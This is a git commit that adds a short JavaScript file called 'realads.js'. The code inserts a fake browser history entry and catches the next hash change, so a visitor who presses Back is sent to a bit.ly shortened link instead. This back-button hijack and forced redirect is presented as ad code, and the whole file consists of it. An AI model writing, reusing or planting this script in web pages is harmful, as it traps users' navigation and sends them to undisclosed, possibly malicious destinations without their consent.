f8b872d07337a9dd3f229dacd0664d2c0a00b890
okpoz <okpoitidz@gmail.com>
2025-12-26 10:22:23 +0100

    Create realads.js

---
+++ realads.js
@@ -0,0 +1,17 @@
+window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://bit.ly/3W6qUJU";
+    }
+    function goon(){
+        location.href="https://bit.ly/3W6qUJU";
+    }
+function goon(){
+        location.href="https://bit.ly/3W6qUJU";
+    }
+function goon(){
+        location.href="https://bit.ly/3W6qUJU";
+    }
